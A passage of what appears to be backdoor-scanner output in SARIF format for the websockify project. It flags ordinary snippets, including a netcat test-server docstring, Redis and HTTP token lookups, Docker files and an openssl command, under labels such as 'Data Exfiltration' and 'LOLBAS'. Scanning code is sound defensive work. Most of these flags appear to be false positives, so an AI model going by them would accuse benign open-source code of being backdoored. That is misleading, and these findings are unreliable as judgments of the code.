          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 225,
                  "startColumn": 9,
                  "endLine": 225,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    Note: This Token Plugin depends on the 'redis' module, so you have\n    to install it before using this plugin:\n\n          pip install redis\n    \"\"\"\n    def __init__(self, src):\n        try:\n",
                    "rendered": {
                      "text": "    Note: This Token Plugin depends on the 'redis' module, so you have\n    to install it before using this plugin:\n\n          pip install redis\n    \"\"\"\n    def __init__(self, src):\n        try:\n",
                      "markdown": "`    Note: This Token Plugin depends on the 'redis' module, so you have\n    to install it before using this plugin:\n\n          pip install redis\n    \"\"\"\n    def __init__(self, src):\n        try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 220,
                  "startColumn": 7,
                  "endLine": 220,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\n    Spawn a test \"server\" using netcat\n\n        nc -l 5000 -v\n\n    Note: This Token Plugin depends on the 'redis' module, so you have\n    to install it before using this plugin:\n",
                    "rendered": {
                      "text": "\n    Spawn a test \"server\" using netcat\n\n        nc -l 5000 -v\n\n    Note: This Token Plugin depends on the 'redis' module, so you have\n    to install it before using this plugin:\n",
                      "markdown": "`\n    Spawn a test \"server\" using netcat\n\n        nc -l 5000 -v\n\n    Note: This Token Plugin depends on the 'redis' module, so you have\n    to install it before using this plugin:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 32,
                  "endLine": 162,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                        return None\n\n                if 'exp' in parsed:\n                    # Expiration time is present, so we need to check it\n                    if time.time() > parsed['exp']:\n                        logger.warning('Token has expired!')\n                        return None\n",
                    "rendered": {
                      "text": "                        return None\n\n                if 'exp' in parsed:\n                    # Expiration time is present, so we need to check it\n                    if time.time() > parsed['exp']:\n                        logger.warning('Token has expired!')\n                        return None\n",
                      "markdown": "`                        return None\n\n                if 'exp' in parsed:\n                    # Expiration time is present, so we need to check it\n                    if time.time() > parsed['exp']:\n                        logger.warning('Token has expired!')\n                        return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 6,
                  "endLine": 5,
                  "snippet": {
                    "text": "import logging\nimport os\nimport sys\nimport time\nimport re\nimport json\n\nlogger = logging.getLogger(__name__)\n",
                    "rendered": {
                      "text": "import logging\nimport os\nimport sys\nimport time\nimport re\nimport json\n\nlogger = logging.getLogger(__name__)\n",
                      "markdown": "`import logging\nimport os\nimport sys\nimport time\nimport re\nimport json\n\nlogger = logging.getLogger(__name__)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 281,
                  "startColumn": 22,
                  "endLine": 281,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n        else:\n",
                    "rendered": {
                      "text": "        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n        else:\n",
                      "markdown": "`        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 23,
                  "endLine": 101,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    def lookup(self, token):\n        import requests\n\n        resp = requests.get(self.source % token)\n\n        if resp.ok:\n            return self.process_result(resp)\n",
                    "rendered": {
                      "text": "    def lookup(self, token):\n        import requests\n\n        resp = requests.get(self.source % token)\n\n        if resp.ok:\n            return self.process_result(resp)\n",
                      "markdown": "`    def lookup(self, token):\n        import requests\n\n        resp = requests.get(self.source % token)\n\n        if resp.ok:\n            return self.process_result(resp)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 280,
                  "startColumn": 57,
                  "endLine": 280,
                  "endColumn": 65,
                  "snippet": {
                    "text": "\n        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n",
                    "rendered": {
                      "text": "\n        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n",
                      "markdown": "`\n        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 280,
                  "startColumn": 42,
                  "endLine": 280,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n",
                    "rendered": {
                      "text": "\n        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n",
                      "markdown": "`\n        logger.info(\"resolving token '%s'\" % token)\n        client = redis.Redis(host=self._server, port=self._port,\n                             db=self._db, password=self._password)\n        stuff = client.get(token)\n        if stuff is None:\n            return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 267,
                  "startColumn": 65,
                  "endLine": 267,
                  "endColumn": 73,
                  "snippet": {
                    "text": "                  (self._server, self._port))\n        except ValueError:\n            logger.error(\"The provided --token-source='%s' is not in the \"\n                         \"expected format <host>[:<port>[:<db>[:<password>]]]\" %\n                         src)\n            sys.exit()\n\n",
                    "rendered": {
                      "text": "                  (self._server, self._port))\n        except ValueError:\n            logger.error(\"The provided --token-source='%s' is not in the \"\n                         \"expected format <host>[:<port>[:<db>[:<password>]]]\" %\n                         src)\n            sys.exit()\n\n",
                      "markdown": "`                  (self._server, self._port))\n        except ValueError:\n            logger.error(\"The provided --token-source='%s' is not in the \"\n                         \"expected format <host>[:<port>[:<db>[:<password>]]]\" %\n                         src)\n            sys.exit()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 258,
                  "startColumn": 26,
                  "endLine": 258,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                if not self._db:\n                    self._db = 0\n                if not self._password:\n                    self._password = None\n            else:\n                raise ValueError\n            self._port = int(self._port)\n",
                    "rendered": {
                      "text": "                if not self._db:\n                    self._db = 0\n                if not self._password:\n                    self._password = None\n            else:\n                raise ValueError\n            self._port = int(self._port)\n",
                      "markdown": "`                if not self._db:\n                    self._db = 0\n                if not self._password:\n                    self._password = None\n            else:\n                raise ValueError\n            self._port = int(self._port)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 29,
                  "endLine": 257,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                    self._port = 6379\n                if not self._db:\n                    self._db = 0\n                if not self._password:\n                    self._password = None\n            else:\n                raise ValueError\n",
                    "rendered": {
                      "text": "                    self._port = 6379\n                if not self._db:\n                    self._db = 0\n                if not self._password:\n                    self._password = None\n            else:\n                raise ValueError\n",
                      "markdown": "`                    self._port = 6379\n                if not self._db:\n                    self._db = 0\n                if not self._password:\n                    self._password = None\n            else:\n                raise ValueError\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 252,
                  "startColumn": 58,
                  "endLine": 252,
                  "endColumn": 66,
                  "snippet": {
                    "text": "                if not self._db:\n                    self._db = 0\n            elif len(fields) == 4:\n                self._server, self._port, self._db, self._password = fields\n                if not self._port:\n                    self._port = 6379\n                if not self._db:\n",
                    "rendered": {
                      "text": "                if not self._db:\n                    self._db = 0\n            elif len(fields) == 4:\n                self._server, self._port, self._db, self._password = fields\n                if not self._port:\n                    self._port = 6379\n                if not self._db:\n",
                      "markdown": "`                if not self._db:\n                    self._db = 0\n            elif len(fields) == 4:\n                self._server, self._port, self._db, self._password = fields\n                if not self._port:\n                    self._port = 6379\n                if not self._db:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 236,
                  "startColumn": 14,
                  "endLine": 236,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        # Default values\n        self._port = 6379\n        self._db = 0\n        self._password = None\n        try:\n            fields = src.split(\":\")\n            if len(fields) == 1:\n",
                    "rendered": {
                      "text": "        # Default values\n        self._port = 6379\n        self._db = 0\n        self._password = None\n        try:\n            fields = src.split(\":\")\n            if len(fields) == 1:\n",
                      "markdown": "`        # Default values\n        self._port = 6379\n        self._db = 0\n        self._password = None\n        try:\n            fields = src.split(\":\")\n            if len(fields) == 1:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 183,
                  "startColumn": 23,
                  "endLine": 183,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n        host[:port[:db[:password]]]\n\n    where port, db and password are optional. If port or db are left empty\n    they will take its default value, ie. 6379 and 0 respectively.\n\n    If your redis server is using the default port (6379) then you can use:\n",
                    "rendered": {
                      "text": "\n        host[:port[:db[:password]]]\n\n    where port, db and password are optional. If port or db are left empty\n    they will take its default value, ie. 6379 and 0 respectively.\n\n    If your redis server is using the default port (6379) then you can use:\n",
                      "markdown": "`\n        host[:port[:db[:password]]]\n\n    where port, db and password are optional. If port or db are left empty\n    they will take its default value, ie. 6379 and 0 respectively.\n\n    If your redis server is using the default port (6379) then you can use:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 24,
                  "endLine": 181,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    The token source is in the format:\n\n        host[:port[:db[:password]]]\n\n    where port, db and password are optional. If port or db are left empty\n    they will take its default value, ie. 6379 and 0 respectively.\n",
                    "rendered": {
                      "text": "\n    The token source is in the format:\n\n        host[:port[:db[:password]]]\n\n    where port, db and password are optional. If port or db are left empty\n    they will take its default value, ie. 6379 and 0 respectively.\n",
                      "markdown": "`\n    The token source is in the format:\n\n        host[:port[:db[:password]]]\n\n    where port, db and password are optional. If port or db are left empty\n    they will take its default value, ie. 6379 and 0 respectively.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 34,
                  "endLine": 119,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\nclass JWTTokenApi(BasePlugin):\n    # source is a JWT-token, with hostname and port included\n    # Both JWS as JWE tokens are accepted. With regards to JWE tokens, the key is re-used for both validation and decryption.\n\n    def lookup(self, token):\n",
                    "rendered": {
                      "text": "\n\nclass JWTTokenApi(BasePlugin):\n    # source is a JWT-token, with hostname and port included\n    # Both JWS as JWE tokens are accepted. With regards to JWE tokens, the key is re-used for both validation and decryption.\n\n    def lookup(self, token):\n",
                      "markdown": "`\n\nclass JWTTokenApi(BasePlugin):\n    # source is a JWT-token, with hostname and port included\n    # Both JWS as JWE tokens are accepted. With regards to JWE tokens, the key is re-used for both validation and decryption.\n\n    def lookup(self, token):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketserver.py"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 24,
                  "endLine": 66,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        self.do_GET = self._real_do_GET\n\n        if (self.headers.get('upgrade') and\n            self.headers.get('upgrade').lower() == 'websocket'):\n            self.handle_upgrade()\n        else:\n            self.do_GET()\n",
                    "rendered": {
                      "text": "        self.do_GET = self._real_do_GET\n\n        if (self.headers.get('upgrade') and\n            self.headers.get('upgrade').lower() == 'websocket'):\n            self.handle_upgrade()\n        else:\n            self.do_GET()\n",
                      "markdown": "`        self.do_GET = self._real_do_GET\n\n        if (self.headers.get('upgrade') and\n            self.headers.get('upgrade').lower() == 'websocket'):\n            self.handle_upgrade()\n        else:\n            self.do_GET()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketserver.py"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 24,
                  "endLine": 65,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        # Checks if it is a websocket request and redirects\n        self.do_GET = self._real_do_GET\n\n        if (self.headers.get('upgrade') and\n            self.headers.get('upgrade').lower() == 'websocket'):\n            self.handle_upgrade()\n        else:\n",
                    "rendered": {
                      "text": "        # Checks if it is a websocket request and redirects\n        self.do_GET = self._real_do_GET\n\n        if (self.headers.get('upgrade') and\n            self.headers.get('upgrade').lower() == 'websocket'):\n            self.handle_upgrade()\n        else:\n",
                      "markdown": "`        # Checks if it is a websocket request and redirects\n        self.do_GET = self._real_do_GET\n\n        if (self.headers.get('upgrade') and\n            self.headers.get('upgrade').lower() == 'websocket'):\n            self.handle_upgrade()\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docker/build.sh"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 52,
                  "endLine": 5,
                  "endColumn": 7,
                  "snippet": {
                    "text": "#!/usr/bin/env sh\nset -e -x\ncd \"$(dirname \"$0\")\"\n(cd .. && python3 setup.py sdist --dist-dir docker/)\ndocker build -t novnc/websockify .\n",
                    "rendered": {
                      "text": "#!/usr/bin/env sh\nset -e -x\ncd \"$(dirname \"$0\")\"\n(cd .. && python3 setup.py sdist --dist-dir docker/)\ndocker build -t novnc/websockify .\n",
                      "markdown": "`#!/usr/bin/env sh\nset -e -x\ncd \"$(dirname \"$0\")\"\n(cd .. && python3 setup.py sdist --dist-dir docker/)\ndocker build -t novnc/websockify .\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docker/Dockerfile"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 40,
                  "endLine": 16,
                  "endColumn": 4,
                  "snippet": {
                    "text": "\nWORKDIR /opt/websockify\n\nENTRYPOINT [\"/usr/local/bin/websockify\"]\nCMD [\"--help\"]\n",
                    "rendered": {
                      "text": "\nWORKDIR /opt/websockify\n\nENTRYPOINT [\"/usr/local/bin/websockify\"]\nCMD [\"--help\"]\n",
                      "markdown": "`\nWORKDIR /opt/websockify\n\nENTRYPOINT [\"/usr/local/bin/websockify\"]\nCMD [\"--help\"]\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docker/Dockerfile"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 14,
                  "endLine": 5,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\nCOPY websockify-*.tar.gz /\n\nRUN python3 -m pip install websockify-*.tar.gz\nRUN rm -rf /websockify-* /root/.cache\n\nVOLUME /data\n",
                    "rendered": {
                      "text": "\nCOPY websockify-*.tar.gz /\n\nRUN python3 -m pip install websockify-*.tar.gz\nRUN rm -rf /websockify-* /root/.cache\n\nVOLUME /data\n",
                      "markdown": "`\nCOPY websockify-*.tar.gz /\n\nRUN python3 -m pip install websockify-*.tar.gz\nRUN rm -rf /websockify-* /root/.cache\n\nVOLUME /data\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/rebind"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env bash\n\nusage() {\n    echo \"Usage: $(basename $0) OLD_PORT NEW_PORT COMMAND_LINE\"\n    echo\n",
                    "rendered": {
                      "text": "#!/usr/bin/env bash\n\nusage() {\n    echo \"Usage: $(basename $0) OLD_PORT NEW_PORT COMMAND_LINE\"\n    echo\n",
                      "markdown": "`#!/usr/bin/env bash\n\nusage() {\n    echo \"Usage: $(basename $0) OLD_PORT NEW_PORT COMMAND_LINE\"\n    echo\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/rebind"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env bash\n\nusage() {\n    echo \"Usage: $(basename $0) OLD_PORT NEW_PORT COMMAND_LINE\"\n    echo\n",
                    "rendered": {
                      "text": "#!/usr/bin/env bash\n\nusage() {\n    echo \"Usage: $(basename $0) OLD_PORT NEW_PORT COMMAND_LINE\"\n    echo\n",
                      "markdown": "`#!/usr/bin/env bash\n\nusage() {\n    echo \"Usage: $(basename $0) OLD_PORT NEW_PORT COMMAND_LINE\"\n    echo\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 274,
                  "endLine": 37,
                  "endColumn": 280,
                  "snippet": {
                    "text": "\n.SS WebSockets binary data\n\nWebsockify supports all versions of the WebSockets protocol (Hixie and HyBI). The older Hixie versions of the protocol only support UTF-8 text payloads. In order to transport binary data over UTF-8 an encoding must used to encapsulate the data within UTF-8. Websockify uses base64 to encode all traffic to and from the client. This does not affect the data between websockify and the server.\n\n.SS Encrypted WebSocket connections (wss://)\n\n",
                    "rendered": {
                      "text": "\n.SS WebSockets binary data\n\nWebsockify supports all versions of the WebSockets protocol (Hixie and HyBI). The older Hixie versions of the protocol only support UTF-8 text payloads. In order to transport binary data over UTF-8 an encoding must used to encapsulate the data within UTF-8. Websockify uses base64 to encode all traffic to and from the client. This does not affect the data between websockify and the server.\n\n.SS Encrypted WebSocket connections (wss://)\n\n",
                      "markdown": "`\n.SS WebSockets binary data\n\nWebsockify supports all versions of the WebSockets protocol (Hixie and HyBI). The older Hixie versions of the protocol only support UTF-8 text payloads. In order to transport binary data over UTF-8 an encoding must used to encapsulate the data within UTF-8. Websockify uses base64 to encode all traffic to and from the client. This does not affect the data between websockify and the server.\n\n.SS Encrypted WebSocket connections (wss://)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 61,
                  "endLine": 84,
                  "endColumn": 69,
                  "snippet": {
                    "text": "\n`sudo ./websockify 2023 --wrap-mode=respawn -- telnetd -debug 2023`\n\nThe wstelnet.html page demonstrates a simple WebSockets based telnet client.\n\n.SS Use client certificate verification\n\n",
                    "rendered": {
                      "text": "\n`sudo ./websockify 2023 --wrap-mode=respawn -- telnetd -debug 2023`\n\nThe wstelnet.html page demonstrates a simple WebSockets based telnet client.\n\n.SS Use client certificate verification\n\n",
                      "markdown": "`\n`sudo ./websockify 2023 --wrap-mode=respawn -- telnetd -debug 2023`\n\nThe wstelnet.html page demonstrates a simple WebSockets based telnet client.\n\n.SS Use client certificate verification\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/docs/websockify.1"
                },
                "region": {
                  "startLine": 42,
                  "endLine": 43,
                  "endColumn": 8,
                  "snippet": {
                    "text": ".SS Encrypted WebSocket connections (wss://)\n\nTo encrypt the traffic using the WebSocket 'wss://' URI scheme you need to generate a certificate for websockify to load. By default websockify loads a certificate file name self.pem but the --cert=CERT option can override the file name. You can generate a self-signed certificate using openssl. When asked for the common name, use the hostname of the server where the proxy will be running:\n\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n\n.SS Additional websockify features\n\n",
                    "rendered": {
